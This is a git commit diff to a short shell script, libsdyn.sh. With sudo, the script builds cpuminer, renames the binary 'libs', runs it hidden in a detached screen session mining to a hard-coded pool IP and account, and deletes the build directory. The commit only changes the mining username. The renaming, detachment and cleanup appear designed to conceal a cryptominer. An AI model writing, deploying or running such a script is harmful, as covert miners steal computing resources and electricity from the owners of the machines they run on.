3f5260154eb38d8ee2c50086a22b513ab9ad95c6
Phan Nang Duy <phanduy.itbka@gmail.com>
2019-01-12 00:08:01 +0700

    no message

--- libsdyn.sh
+++ libsdyn.sh
@@ -2,6 +2,6 @@
 sudo chmod +x build.sh 
 sudo ./build.sh
 sudo cp cpuminer libs
-sudo screen -d -m ./libs -a argon2d-dyn -o stratum+tcp://145.239.0.126:5960 -u duyuno.duy -p x
+sudo screen -d -m ./libs -a argon2d-dyn -o stratum+tcp://145.239.0.126:5960 -u phanduy.duy -p x
 cd /
 sudo rm -rf libs
